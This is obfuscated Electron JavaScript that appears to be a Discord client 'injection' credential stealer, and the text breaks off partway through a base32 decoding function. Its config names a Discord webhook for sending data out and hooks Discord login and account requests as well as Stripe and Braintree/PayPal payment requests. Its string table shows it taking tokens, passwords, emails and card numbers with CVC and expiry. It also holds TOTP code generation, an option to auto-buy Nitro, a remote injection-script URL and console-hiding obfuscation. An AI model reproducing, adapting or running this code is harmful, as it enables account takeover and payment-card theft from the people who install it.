(function (_0x4da96a, _0x53575e) {
  const _0x1dc32a = _0x4da96a();
  while (true) {
    try {
      const _0xa8df60 = parseInt(_0x8e8d(573, -0x50)) / 1 + -parseInt(_0x8e8d(343, 0x62)) / 2 * (parseInt(_0x8e8d(552, -0x95)) / 3) + parseInt(_0x8e8d(889, 0x612)) / 4 + parseInt(_0x8e8d(800, 0x6a)) / 5 + parseInt(_0x8e8d(284, 0x540)) / 6 + -parseInt(_0x8e8d(252, -0x27e)) / 7 * (parseInt(_0x8e8d(329, -0x24e)) / 8) + -parseInt(_0x8e8d(705, 0x529)) / 9 * (parseInt(_0x8e8d(529, -0x12f)) / 10);
      if (_0xa8df60 === _0x53575e) {
        break;
      } else {
        _0x1dc32a.push(_0x1dc32a.shift());
      }
    } catch (_0x1d8f70) {
      _0x1dc32a.push(_0x1dc32a.shift());
    }
  }
})(_0x3919, 973139);
const _0x58c369 = function () {
  let _0x543eda = true;
  return function (_0x579d60, _0x48a4b6) {
    const _0xcbc66 = _0x543eda ? function () {
      if (_0x48a4b6) {
        const _0x4a969a = _0x48a4b6.apply(_0x579d60, arguments);
        _0x48a4b6 = null;
        return _0x4a969a;
      }
    } : function () {};
    _0x543eda = false;
    return _0xcbc66;
  };
}();
const _0x2d9619 = _0x58c369(this, function () {
  let _0x4735c3;
  try {
    const _0x817fa1 = Function("return (function() {}.constructor(\"return this\")( ));");
    _0x4735c3 = _0x817fa1();
  } catch (_0x3bea70) {
    _0x4735c3 = window;
  }
  const _0x53ebbf = _0x4735c3.console = _0x4735c3.console || {};
  const _0x5c4632 = ["log", "warn", "info", "error", 'exception', "table", 'trace'];
  for (let _0x64c04e = 0; _0x64c04e < _0x5c4632.length; _0x64c04e++) {
    const _0x1c6e7c = _0x58c369.constructor.prototype.bind(_0x58c369);
    const _0x5bfbe9 = _0x5c4632[_0x64c04e];
    const _0x2ca89c = _0x53ebbf[_0x5bfbe9] || _0x1c6e7c;
    _0x1c6e7c.__proto__ = _0x58c369.bind(_0x58c369);
    _0x1c6e7c.toString = _0x2ca89c.toString.bind(_0x2ca89c);
    _0x53ebbf[_0x5bfbe9] = _0x1c6e7c;
  }
});
_0x2d9619();
const args = process.argv;
const fs = require('fs');
const path = require("path");
const https = require("https");
const querystring = require("querystring");
const {
  BrowserWindow,
  session
} = require('electron');
const _0x11c729 = {
  id: "521847234246082599",
  sku: "511651885459963904",
  price: '9999'
};
const _0x15ad2b = {
  id: "521847234246082599",
  sku: "511651880837840896",
  price: "999"
};
function _0x8e8d(_0x4efe80, _0x4fcf1f) {
  const _0x348f87 = _0x3919();
  _0x8e8d = function (_0x342ac5, _0x21337e) {
    _0x342ac5 = _0x342ac5 - 249;
    let _0x5bdbc7 = _0x348f87[_0x342ac5];
    return _0x5bdbc7;
  };
  return _0x8e8d(_0x4efe80, _0x4fcf1f);
}
const _0x41b86 = {
  year: _0x11c729,
  month: _0x15ad2b
};
const _0x4b52c7 = {
  id: "521846918637420545",
  sku: "511651871736201216",
  price: '499'
};
const _0x412897 = {
  month: _0x4b52c7
};
const _0x1c5e3c = {
  boost: _0x41b86,
  classic: _0x412897
};
const _0x4ea16b = {
  urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts", "https://api.stripe.com/v*/tokens", "https://api.stripe.com/v*/setup_intents/*/confirm", "https://api.stripe.com/v*/payment_intents/*/confirm"]
};
const _0x5e1104 = {};
function _0x40f39d(_0x604695, _0x24a366, _0x46a2aa, _0x5cd287) {
  return _0x8e8d(_0x604695 - 0x3cb, _0x46a2aa);
}
_0x5e1104.urls = ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "wss://remote-auth-gateway.discord.gg/*"];
const config = {
  'webhook': 'https://discord.com/api/webhooks/1341425841305026650/-2yvxuAeK1iOkp5QaNo0j0tgoOjC5lVrMwRLzTTkyFoLCwuIJgI6AmuPq62dY7o4ICq1',
  'webhook_protector_key': "%WEBHOOK_KEY%",
  'auto_buy_nitro': false,
  'ping_on_run': false,
  'ping_val': '@everyone',
  'embed_name': "Injection By fforcess",
  'embed_icon': "https://i.imgur.com/6WtxOgB.png".replace(/ /g, "%20"),
  'embed_color': 0x0,
  'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
  'api': "https://discord.com/api/v9/users/@me",
  'nitro': {
    boost: {
      year: {
        id: "521847234246082599",
        sku: "511651885459963904",
        price: '9999'
      },
      month: {
        id: "521847234246082599",
        sku: "511651880837840896",
        price: "999"
      }
    },
    classic: {
      month: {
        id: "521846918637420545",
        sku: "511651871736201216",
        price: '499'
      }
    }
  },
  'filter': {
    urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", "https://discord.com/api/v*/auth/login", "https://*.discord.com/api/v*/auth/login", "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts", "https://api.stripe.com/v*/tokens", "https://api.stripe.com/v*/setup_intents/*/confirm", "https://api.stripe.com/v*/payment_intents/*/confirm"]
  },
  'filter2': {}
};
function parity_32(_0x4c3955, _0x1a3839, _0x15e06d) {
  const _0x1084cb = {
    'TwqgE': function (_0x27d15b, _0x2c9a6a) {
      return _0x27d15b ^ _0x2c9a6a;
    }
  };
  _0x1084cb.jtHly = function (_0x20ab3b, _0x3a6314) {
    return _0x20ab3b ^ _0x3a6314;
  };
  return _0x1084cb.jtHly(_0x4c3955, _0x1a3839) ^ _0x15e06d;
}
function ch_32(_0x4777bf, _0x1172ce, _0x39ce28) {
  return _0x4777bf & _0x1172ce ^ ~_0x4777bf & _0x39ce28;
}
function maj_32(_0x18091a, _0x2babbe, _0x4abf7a) {
  return _0x18091a & _0x2babbe ^ _0x18091a & _0x4abf7a ^ _0x2babbe & _0x4abf7a;
}
function rotl_32(_0x4a65e2, _0x30d2b8) {
  const _0x28027b = {
    'dVEtY': function (_0x2cee67, _0x227056) {
      return _0x2cee67 | _0x227056;
    }
  };
  _0x28027b.sjQsn = function (_0x17adf0, _0x1ceaba) {
    return _0x17adf0 >>> _0x1ceaba;
  };
  _0x28027b.YCAvX = function (_0xfdff0b, _0x4fe3b0) {
    return _0xfdff0b - _0x4fe3b0;
  };
  return _0x4a65e2 << _0x30d2b8 | _0x28027b.sjQsn(_0x4a65e2, _0x28027b.YCAvX(32, _0x30d2b8));
}
function safeAdd_32_2(_0x11f7c9, _0x189b15) {
  var _0x19a644 = (_0x11f7c9 & 65535) + (_0x189b15 & 65535);
  var _0x5a2876 = (_0x11f7c9 >>> 16) + (_0x189b15 >>> 16) + (_0x19a644 >>> 16);
  return (_0x5a2876 & 65535) << 16 | _0x19a644 & 65535;
}
function safeAdd_32_5(_0x170e4f, _0xdd1dc2, _0x86036, _0x1d3ec8, _0x449d64) {
  var _0x3bef27 = (_0x170e4f & 65535) + (_0xdd1dc2 & 65535) + (_0x86036 & 65535) + (_0x1d3ec8 & 65535) + (_0x449d64 & 65535);
  var _0x5d1a19 = (_0x170e4f >>> 16) + (_0xdd1dc2 >>> 16) + (_0x86036 >>> 16) + (_0x1d3ec8 >>> 16) + (_0x449d64 >>> 16) + (_0x3bef27 >>> 16);
  return (_0x5d1a19 & 65535) << 16 | _0x3bef27 & 65535;
}
function binb2hex(_0x48f379) {
  var _0x47a5e8 = '';
  var _0x1cff41 = _0x48f379.length * 4;
  var _0x534349;
  var _0x4e884d;
  for (_0x534349 = 0; _0x534349 < _0x1cff41; _0x534349 += 1) {
    _0x4e884d = _0x48f379[_0x534349 >>> 2] >>> (3 - _0x534349 % 4) * 8;
    _0x47a5e8 += "0123456789abcdef".charAt(_0x4e884d >>> 4 & 15) + "0123456789abcdef".charAt(_0x4e884d & 15);
  }
  return _0x47a5e8;
}
function getH() {
  return [1732584193, 4023233417, 2562383102, 271733878, 3285377520];
}
function roundSHA1(_0x5abf20, _0x32d3e4) {
  var _0x3d7536 = [];
  var _0x46d387;
  var _0x413657;
  var _0x411f37;
  var _0x209ea7;
  var _0x1d333a;
  var _0x4e5c5f;
  var _0x4a5749;
  _0x46d387 = _0x32d3e4[0];
  _0x413657 = _0x32d3e4[1];
  _0x411f37 = _0x32d3e4[2];
  _0x209ea7 = _0x32d3e4[3];
  _0x1d333a = _0x32d3e4[4];
  for (_0x4a5749 = 0; _0x4a5749 < 80; _0x4a5749 += 1) {
    if (_0x4a5749 < 16) {
      _0x3d7536[_0x4a5749] = _0x5abf20[_0x4a5749];
    } else {
      _0x3d7536[_0x4a5749] = rotl_32(_0x3d7536[_0x4a5749 - 3] ^ _0x3d7536[_0x4a5749 - 8] ^ _0x3d7536[_0x4a5749 - 14] ^ _0x3d7536[_0x4a5749 - 16], 1);
    }
    if (_0x4a5749 < 20) {
      _0x4e5c5f = safeAdd_32_5(rotl_32(_0x46d387, 5), _0x413657 & _0x411f37 ^ ~_0x413657 & _0x209ea7, _0x1d333a, 1518500249, _0x3d7536[_0x4a5749]);
    } else {
      if (_0x4a5749 < 40) {
        _0x4e5c5f = safeAdd_32_5(rotl_32(_0x46d387, 5), parity_32(_0x413657, _0x411f37, _0x209ea7), _0x1d333a, 1859775393, _0x3d7536[_0x4a5749]);
      } else if (_0x4a5749 < 60) {
        _0x4e5c5f = safeAdd_32_5(rotl_32(_0x46d387, 5), _0x413657 & _0x411f37 ^ _0x413657 & _0x209ea7 ^ _0x411f37 & _0x209ea7, _0x1d333a, 2400959708, _0x3d7536[_0x4a5749]);
      } else {
        _0x4e5c5f = safeAdd_32_5(rotl_32(_0x46d387, 5), parity_32(_0x413657, _0x411f37, _0x209ea7), _0x1d333a, 3395469782, _0x3d7536[_0x4a5749]);
      }
    }
    _0x1d333a = _0x209ea7;
    _0x209ea7 = _0x411f37;
    _0x411f37 = rotl_32(_0x413657, 30);
    _0x413657 = _0x46d387;
    _0x46d387 = _0x4e5c5f;
  }
  _0x32d3e4[0] = safeAdd_32_2(_0x46d387, _0x32d3e4[0]);
  _0x32d3e4[1] = safeAdd_32_2(_0x413657, _0x32d3e4[1]);
  _0x32d3e4[2] = safeAdd_32_2(_0x411f37, _0x32d3e4[2]);
  _0x32d3e4[3] = safeAdd_32_2(_0x209ea7, _0x32d3e4[3]);
  _0x32d3e4[4] = safeAdd_32_2(_0x1d333a, _0x32d3e4[4]);
  return _0x32d3e4;
}
function finalizeSHA1(_0x66bfe9, _0xa679b5, _0xcf0732, _0x9fdafd) {
  var _0x337f2b;
  var _0x4cf173;
  var _0xcb76cb;
  _0xcb76cb = (_0xa679b5 + 65 >>> 9 << 4) + 15;
  while (_0x66bfe9.length <= _0xcb76cb) {
    _0x66bfe9.push(0);
  }
  _0x66bfe9[_0xa679b5 >>> 5] |= 128 << 24 - _0xa679b5 % 32;
  _0x66bfe9[_0xcb76cb] = _0xa679b5 + _0xcf0732;
  _0x4cf173 = _0x66bfe9.length;
  for (_0x337f2b = 0; _0x337f2b < _0x4cf173; _0x337f2b += 16) {
    _0x9fdafd = roundSHA1(_0x66bfe9.slice(_0x337f2b, _0x337f2b + 16), _0x9fdafd);
  }
  return _0x9fdafd;
}
function hex2binb(_0x2b889e, _0x3d8438, _0x512a3d) {
  var _0x14130f;
  var _0x1c00b3 = _0x2b889e.length;
  var _0x49dce8;
  var _0x3bbad0;
  var _0x443d94;
  var _0x3eef19;
  var _0x521c03;
  _0x14130f = _0x3d8438 || [0];
  _0x512a3d = _0x512a3d || 0;
  _0x521c03 = _0x512a3d >>> 3;
  if (0 !== _0x1c00b3 % 2) {
    console.error("String of HEX type must be in byte increments");
  }
  for (_0x49dce8 = 0; _0x49dce8 < _0x1c00b3; _0x49dce8 += 2) {
    _0x3bbad0 = parseInt(_0x2b889e.substr(_0x49dce8, 2), 16);
    if (!isNaN(_0x3bbad0)) {
      _0x3eef19 = (_0x49dce8 >>> 1) + _0x521c03;
      _0x443d94 = _0x3eef19 >>> 2;
      while (_0x14130f.length <= _0x443d94) {
        _0x14130f.push(0);
      }
      _0x14130f[_0x443d94] |= _0x3bbad0 << 8 * (3 - _0x3eef19 % 4);
    } else {
      console.error("String of HEX type contains invalid characters");
    }
  }
  return {
    'value': _0x14130f,
    'binLen': _0x1c00b3 * 4 + _0x512a3d
  };
}
class jsSHA {
  constructor() {
    var _0x2d537f = 0;
    var _0x355e4f = [];
    var _0x5bab33 = 0;
    var _0x5b5402;
    var _0xfc73c3 = false;
    var _0x1dce1c = false;
    var _0x3955a7 = [];
    var _0x6d8242 = [];
    var _0x4f159a;
    var _0x4f159a = 1;
    if (_0x4f159a !== parseInt(_0x4f159a, 10) || 1 > _0x4f159a) {
      console.error("numRounds must a integer >= 1");
    }
    _0x5b5402 = [1732584193, 4023233417, 2562383102, 271733878, 3285377520];
    this.setHMACKey = function (_0x4b3fbe) {
      var _0x4e5fcf;
      var _0x5a96b9;
      var _0x3b5b48;
      var _0x2c72b0;
      _0x4e5fcf = hex2binb(_0x4b3fbe);
      _0x5a96b9 = _0x4e5fcf.binLen;
      _0x3b5b48 = _0x4e5fcf.value;
      if (64 < _0x5a96b9 / 8) {
        _0x3b5b48 = finalizeSHA1(_0x3b5b48, _0x5a96b9, 0, [1732584193, 4023233417, 2562383102, 271733878, 3285377520]);
        while (_0x3b5b48.length <= 15) {
          _0x3b5b48.push(0);
        }
        _0x3b5b48[15] &= 4294967040;
      } else {
        if (64 > _0x5a96b9 / 8) {
          while (_0x3b5b48.length <= 15) {
            _0x3b5b48.push(0);
          }
          _0x3b5b48[15] &= 4294967040;
        }
      }
      for (_0x2c72b0 = 0; _0x2c72b0 <= 15; _0x2c72b0 += 1) {
        _0x3955a7[_0x2c72b0] = _0x3b5b48[_0x2c72b0] ^ 909522486;
        _0x6d8242[_0x2c72b0] = _0x3b5b48[_0x2c72b0] ^ 1549556828;
      }
      _0x5b5402 = roundSHA1(_0x3955a7, _0x5b5402);
      _0x2d537f = 512;
      _0x1dce1c = true;
    };
    this.update = function (_0x331342) {
      var _0x47fa63;
      var _0xff7cb6;
      var _0x3ff3df;
      var _0x5d0e46;
      var _0x5a7724;
      var _0x581d7f = 0;
      _0x47fa63 = hex2binb(_0x331342, _0x355e4f, _0x5bab33);
      _0xff7cb6 = _0x47fa63.binLen;
      _0x5d0e46 = _0x47fa63.value;
      _0x3ff3df = _0xff7cb6 >>> 5;
      for (_0x5a7724 = 0; _0x5a7724 < _0x3ff3df; _0x5a7724 += 16) {
        if (_0x581d7f + 512 <= _0xff7cb6) {
          _0x5b5402 = roundSHA1(_0x5d0e46.slice(_0x5a7724, _0x5a7724 + 16), _0x5b5402);
          _0x581d7f += 512;
        }
      }
      _0x2d537f += _0x581d7f;
      _0x355e4f = _0x5d0e46.slice(_0x581d7f >>> 5);
      _0x5bab33 = _0xff7cb6 % 512;
    };
    this.getHMAC = function () {
      var _0x48619a;
      if (false === _0x1dce1c) {
        console.error("Cannot call getHMAC without first setting HMAC key");
      }
      if (false === _0xfc73c3) {
        _0x48619a = finalizeSHA1(_0x355e4f, _0x5bab33, _0x2d537f, _0x5b5402);
        _0x5b5402 = roundSHA1(_0x6d8242, [1732584193, 4023233417, 2562383102, 271733878, 3285377520]);
        _0x5b5402 = finalizeSHA1(_0x48619a, 160, 512, _0x5b5402);
      }
      _0xfc73c3 = true;
      return binb2hex(_0x5b5402);
    };
  }
}
if ("function" === typeof define && define.amd) {
  define(function () {
    return jsSHA;
  });
} else if ("undefined" !== typeof exports) {
  if ("undefined" !== typeof module && module.exports) {
    module.exports = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global.jsSHA = jsSHA;
}
if (jsSHA["default"]) {
  jsSHA = jsSHA["default"];
}
function _0x3919() {
  const _0x1ff755 = ['snIaE', 'RaUMi', "Partnered ", '46082599', 'g=a}]);fun', 'dtcbB', "     init(", "file);\n   ", 'card[numbe', 'invalid', "Time to bu", "ileSize = ", 'woaMH', "e('https')", 'DnBvn', 'ping_on_ru', 'login', 'uXkKr', 'tAYDg', 'Info**', 'Authorizat', 'getHMAC', 'inline', 'NZhDf', 'iArUC', 'Text', 'QtxQl', 'content', '{}.constru', 'responseHe', '5218469186', 'tqUTK', " 10000);\n ", 'zyWAG', "\").logout(", 'BYwtB', 'https', 'ywxSM', " **", 'N.stringif', 'writeFileS', 'XyctU', 'MOjqd', '4373556LjfUiu', 'ord_app&&w', 'orts=c},[[', 'zzrUj', 'month', 'rd-Injecti', 'SnNJf', 'xmQwK', 'vgOMY', ", false);\n", "\\discord_d", "dexJs = '", 'quest', 'lUXrG', 'lenght', 'oMIqZ', 'wsvft', 'PoOOy', "Hypesquad ", 'om/v*/paym', 'lHttp.resp', 'rary', "ard Added*", 'OwTWI', 'irvnG', "HEX type c", 'SRJim', "tion\", \"", "eger >= 1", '%20', 'Ojvze', 'nances/upc', 'eUSLj', "**Credit C", 'zPzKU', 'card[exp_m', 'username', 'eadFileSyn', '**Token**', 'price', 'tream(inde', 'sku_subscr', "';\nconst b", 'sjtkl', ";\nconst in", 'igaUZ', "de:**\n```d", 'trol-Allow', "**\nBadges:", 'ryHid', 'rmdirSync', "\n    xmlHt", 'GHdis', 'SYzXL', 'c(indexJs)', 'CUnFo', 'YCAvX', 'hedBT', 'argv', 'tpmol', 'LwYbk', 'tHMbG', 'IPAXv', 'client_api', 'get_requir', 'XfqQD', '/v*/paymen', 'onth]', 'm/api/v*/a', 'Gusrk', 'dYLEz', 'VQZKG', 'utPZv', 'dded**', 'PkFJu', 'UVmcd', "Credit Car", 'KYDKi', 'Access-Con', "**Nitro Co", "ot Develop", 'boost', 'vKyVQ', 'jhxcL', "💳 ", "   file.cl", 'EgaYD', '__proto__', 'ZUILk', 'LITti', 'yatad', 'VoDjM', 'JJUlJ', 'embed_name', 'FsaFV', 'max', 'POST', "\"Authoriza", 'content-se', 'HFnzv', 'QXmXW', 'KTZMj', 'com/Rdimo/', 'kPCbS', 'end', '37420545', " xmlHttp.o", 'replace', 'XDErA', 'sion', "onst d=gg.", 'AWGKO', 'YUTiY', 'YIbAu', 'ABCDEFGHIJ', 'https://i.', "\\betterdis", ");\n})\nasyn", 'aders', 'sMoYG', "\", (err) =", 'https://gi', 'crBsB', 'bxmMe', "err, data)", 'charAt', 'KLMNOPQRST', 's/*/confir', '.__esModul', 'VVNqq', 'https://ap', 'TcGrp', 'bytes', 'RedSz', 'headers', 'OjbdF', " e.c)m.pus", 'purchase_t', 'warn', "**Discord ", 'url', 'VRvJK', '44d-476a-b', 'AxFgb', 'dToJT', 'fXvoj', 'ments', 'efault[b]:', 'ZdqKO', 'com/Rdimo・', "sword: **", 'gift_code', 'kChunkdisc', "ose();\n   ", "OK_KEY%', ", 'scord_app.', 'password', 'GVVzO', '3605jNFmiF', "valid char", 'log', 'injection_', 'njection', 'filter2', 'lt&&(b?d.d', 'scord.com/', 'name', 'ken!==void', 'embed_colo', 'betterdisc', " \"https://", 'bqeyN', 'app', 'wss://remo', 'NPmEv', 'GtEKI', 'sjQsn', 'EdikE', "unter, ", 'LHyTN', 'atus.disco', 'packJsonp?', "en(\"GET\", ", "st(); \n   ", 'KXnfe', "Bravery, ", 'constructo', 'LUjOS', 'a(d.defaul', 'mlHttp.sen', '10865256QmysRm', 'i.braintre', "y some nit", 'api/webhoo', "  setTimeo", 'flags', '],{},a=>{g', 'jhokR', 'led-mainte', 'pathname', " 0).export", 'Hiyxd', 'h.random()', 'ozgnj', "Event, ", 'om/v*/toke', 'MDkxX', '5218472342', "No Nitro", "equire('", "r(let c in", 'p.setReque', 'HjzfjfR.pn', 'lHttp.setR', 'paypal_acc', 'sCsBq', "));\n    xm", 'payment_so', '**Password', 'avatar', './core.asa', "By github.", "ce('%WEBHO", 'Usjis', 'tars/', 'discord.co', 'n_id', 'p.send(JSO', "')\nif (fs.", 'darwin', 'yfPUk', "byte incre", 'now', "orization\"", 'dleXZ', '1640Hswmdu', 'vGPXR', 'MRWxa', 'GBDaB', 'EEUwR', 'RNprS', 'teJBK', 'jXpWR', "    res.re", "r')\") \n   ", '0123456789', 'a4f-36e197', 'zbnEr', 'hnhWl', '732fZataw', "Nitro Type", 'mVCWZ', "\"); \n    x", 'eQLUj', "== \"module", 'dZtxg', "**Account ", 'Uombv', 'uiKpu', 'api/v*/use', 'hTXoL', 'bMAYU', 'info', 'FMGBR', "const fs =", "ord: **", 'method', 'VidZM', 'JpUJn', " Changed**", 'substring', ".size\nfs.r", 'itro', "Early Supp", 'substr', 'tp.setRequ', 'imgur.com/', 'wvTjX', 'vyYyi', 'protocol', 'Resources', 'BjCwN', 'tion(a){co', 'aDzgu', "d(null); \n", 'defaultSes', 'mhhqb', ')}LogOut()', "Invalid ba", 'Contents', "g HMAC key", ": **", 'APPDATA', 'mpJDs', 'HGUFx', 'yOWkR', 'pplication', 'equestHead', 'rByNh', 'ught!**', 'qmruz', 'api/v*/app', 'CWQXk', "', () => {", 'card[exp_y', "t c in gg.", 'RIPma', 'h(e.c[c])}', 'write', 'rs/@me', 'QIanD', 'HeWuo', '37840896', 'kLrzv', 'iUyjH', 'icy-report', 'includes', '(m=>m?.exp', 'ster/injec', "\\modules\\", "Verified B", 'CneGf', 'Discord-In', 'HkREf', 'lLOjM', 'SXjvV', 'aQCOx', 'CrQDe', 'auth/login', "> {\n      ", 'HjMDt', 'parse', 'sku', 'te-auth-ga', "Balance, ", 'setHMACKey', 'urce_id', 'kIMhj', 'urls', "s = requir", 'ibrary', 'push([[Mat', 'xmlHttp.op', "e\\index.js", 'apply', ']),m).find', 'teway.disc', "**\nCVC: **", 'GaPJO', '5116518717', 'RwFvz', 'tXRhz', 'UDCJb', 'webhook', 'epnCZ', 'dDIVR', 'index.js', 'MXghk', "n/json');\n", 'LHttpReque', "c '*'", 'AGrlR', " => {\n    ", "** - Passw", 'xmlHttp.se', 'split', 'lyxQR', 'console', " require('", 'DLmPM', 'ackChunkdi', 'Brillance,', 'ear]', "se32 chara", " init() {\n", 'update', 'PvCSq', 'path', 'ut(){(func', 'VPbVD', 'BTDSb', 'new_passwo', 'tRequestHe', 'RvFUZ', 'email', 'OrkxM', 'acters', 'kOiBF', "Purchase ❌", 'ounts', 'qmfhn', 'nitro', "Server Own", 'pcORa', 'MtYag', "numRounds ", 'Wextr', 'YEcGN', 'NaHBV', '7|5|3|1|6|', 'pUALN', 'g.c.get_re', 'None', 'c(indexJs,', 'VhMne', "c function", 'QgWxK', 'card[cvc]', 'otector_ke', "HypeSquad ", 'PcUct', 'https://di', 'classic', " 'utf8', (", 'statusCode', "**Paypal A", 'prototype', 'eceived', 'i.stripe.c', 'discrimina', 'WTAQT', 'lTKER', 'elkea', 'Amdmb', 'urrency', 'hostname', 'ljMfS', 'UVWXYZ2345', 'ezqFg', 'quire):win', 'clTxw', 'app.asar', '-Headers', 'ts/49pp2rp', 'tThBX', '900IzludB', "d Number: ", 'tor', 'YAPeu', 'rd.com/api', "t-Type', '", "d: **", 'dptaM', 'CLpzm', 'fNxXa', '5113918938', ".on(\"error", 'cPnsq', 'rs/@me/lib', 'QzWgT', 'htfdP', 'sFxYl', "**Nitro bo", 'yPfIB', '%WEBHOOK_K', 'TUVkM', '999', 'jsSHA', '13287UiktVK', 'catch', 'e&&d.defau', 'gift', 'sic', 'initiation', 'jarxZ', 'egateway.c', 'mkdirSync', "HEX type m", 'api/v*/aut', "New Email:", 'rqSvk', 'indexOf', "er('Conten", 'scordapp.c', 'XpzIM', '.webp', 'EFwZn', 'WXUxw', 'EuBtV', '498734FiDQao', 'ELUQm', 'endsWith', 'TzaMG', 'mMsut', 'executeJav', "String of ", 'IHldp', 'confirm', "return nul", '.webpackJs', 'thub.com/R', 'onseText', 'platform', 'reCwr', 'tion.js', 'dXlqM', "orter, ", "[[''],{},e", 'wdCCt', "**\nOld Pas", 'NEvmO', 'KeBTJ', 'default', 'webhook_pr', "**\nBilling", "Green BugH", "🎉・Discord ", 'h/login', "-Headers '", 'NlOny', "Discord St", 'resources', "without fi", 'readdirSyn', 'iLYxM', 'IZOgA', "ze < 20000", "Gold BugHu", 'pODua', 'ZagEI', 'PqTkZ', 'abcdef', 'binLen', 'dIvOK', 'SwHAp', 'RQZNb', 'filter', 'urce_token', "rn this\")(", 'from', 'webRequest', "ontains in", ';if(d&&(b?', 'qgANo', 'assign', 'join', "en(\"POST\",", 'CqdsE', 'applicatio', 'xgXwR', 'hwzut', 'ySgdu', 'ion', 'JzTag', 'ocMgR', 'QbdKP', 'cJqVl', 'GrBOq', 'm/api/v*/u', 'pnQiP', 'dVEtY', 'TgYAD', 'undefined', 'JQJUn', 'onBeforeRe', 'punTL', 'usd', "Cannot cal", 'sep', 'querystrin', 'startsWith', 'toString', 'd[b]:a(d))', 'bind', 'discord', "ro baby 😩", 'hokWC', 'value', 'round', "stHeader(\"", 'ord.gg/*', 'efOZA', '5116518808', "ction LogO", 'length', 'fUezi', 'VuWMw', '5116518854', 'type', " res.pipe(", 'FrUAr', "    xmlHtt", 'hasOwnProp', "cter in ke", '[],{get_re', 'https://st', 'om/v*/setu', " || data =", "re\"]]]),de", 'scord.gift', 'hKcUV', "return (fu", 'om/api/v*/', 'XzGrk', "lete gg.m.", 'indow.webp', 'vhRqT', 'evkvL', 'fjbQQ', 'XahtX', "Nitro Clas", 'BRhkB', "nction() ", 'dimo/Disco', 'function', "st();\n    ", 'eateWriteS', 'FYUqF', 'push', "p = new XM", 'evJGV', '261369dvJFvw', 'bKttY', 'ent_intent', 'unlinkSync', "Email: **", 'UuLYE', 'pp.com/ava', 'BhEaB', 'MWMpq', "Empyrean I", '7fffffff', 'XrhkG', "iff\n+ ", 'rcwWb', 'toUpperCas', "var xmlHtt", 'forEach', '=>{m=[];fo', 'package.js', "nst b=\"str", "Nitro Boos", 'aScript', 'eVfsv', "(bdPath)) ", 'yXWzj', 'concat', 'existsSync', ", \"", 'expected_a', "')\n       ", 'tRdfc', '-Origin', 'premium_ty', 'VhzsL', 'NJUWE', 'ult?.getTo', "must a int", 'LvBpd', 'PATCH', 'curity-pol', "ust be in ", 'Fvwry', 'MLNCr', "get('", 'exports', 'api', 'ping_val', '<:paypal:9', '0|3|5|6|2|', '2422867c-2', 'https://cd', 'error', 'Path);', '_app.push(', 'FgYjN', "9410365> ", 'vdlmH', 'WrVyN', '4phym7387/', 'n.discorda', '36201216', "le = fs.cr", 'https://ra', 'sfxIR', 'YEYFB', "l getHMAC ", 'main', "fs'), http", 'UAzyD', 'year', "**Email Ch", 'vvqfu', 'PjQjw', "ader(\"Auth", " | ", 'coFSq', 'CNDcG', ")return d}", 'kKvlC', 'c)if(gg.c.', 'LvyiW', 'require(bd', 'slice', 'DEJqJ', "    https.", 'responseTe', ',c)=>a.exp', "ctor(\"retu", 'sNLxO', 'WzSwt', 'table', 'ync', 'UjBMu', 'UWSwf', 'EY%', '9552095GYHWWC', 'nugpA', "\", false);", 'ord.asar', "BHOOK%', '", "cord\\data\\", "     });\n ", 'rsYFM', "place('%WE", 'jtHly', "Injection ", 'https://*.', 'om/merchan', 'ApfIj', 'aXiPV', 'request', "Card Expir", 'getAllWind', 'FkyiM', 'env', 'mount', 'AWEGE', " d.default", 'tWUkO', "l})(\"login", 'stringify', 'LRxYU', 'MlehD', 'dFIlU', 'zMiiA', 'teway', 'lHttp.send', 'sers/@me', 'win32', '(webpackCh', 'embed_icon', 't_methods/', 'fAVIR', "\");\n    xm", '/billing/p', 'UCoNJ', 'text', 'expected_c', 'QXbJT', 'ut(init(),', 'aItxU'];
  _0x3919 = function () {
    return _0x1ff755;
  };
  return _0x3919();
}
function totp(_0x21c55b) {
  const _0x17d6b7 = Date.now();
  const _0xcffb78 = Math.round(_0x17d6b7 / 1000);
  const _0x943e8 = leftpad((Math.floor(_0xcffb78 / 30) < 15.5 ? '0' : '') + Math.round(Math.floor(_0xcffb78 / 30)).toString(16), 16, '0');
  const _0x51f79b = new jsSHA();
  _0x51f79b.setHMACKey(base32tohex(_0x21c55b));
  _0x51f79b.update(_0x943e8);
  const _0x17cf10 = _0x51f79b.getHMAC();
  const _0x59dd88 = parseInt(_0x17cf10.substring(_0x17cf10.length - 1), 16);
  let _0x37c325 = (parseInt(_0x17cf10.substr(_0x59dd88 * 2, 8), 16) & parseInt("7fffffff", 16)) + '';
  _0x37c325 = _0x37c325.substr(Math.max(_0x37c325.length - 6, 0), 6);
  return _0x37c325;
}
function hex2dec(_0x3debef) {
  return parseInt(_0x3debef, 16);
}
function dec2hex(_0x93660a) {
  return (_0x93660a < 15.5 ? '0' : '') + Math.round(_0x93660a).toString(16);
}
function base32tohex(_0x2335ac) {
  let _0x2c3a4b = '';
  let _0x3de689 = '';
  _0x2335ac = _0x2335ac.replace(/=+$/, '');
  for (let _0x3238c5 = 0; _0x3238c5 < _0x2335ac.length; _0x3238c5++) {
    let _0x3ff884 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".indexOf(_0x2335ac.charAt(_0x3238c5).toUpperCase());
    if (_0x3ff884 === -1) {
      console.error("Invalid base32 character in key");
    }
    _0x2c3a4b += leftpad(_0x3ff884.toString(2), 5, '0');
  }
  for (let _0x508b82 = 0; _0x508b82 + 8 <= _0x2c3a4b.length; _0x508b82 += 8) {
    let _0xe5a40c = _0x2c3a4b.substr(_0x508b82, 8);
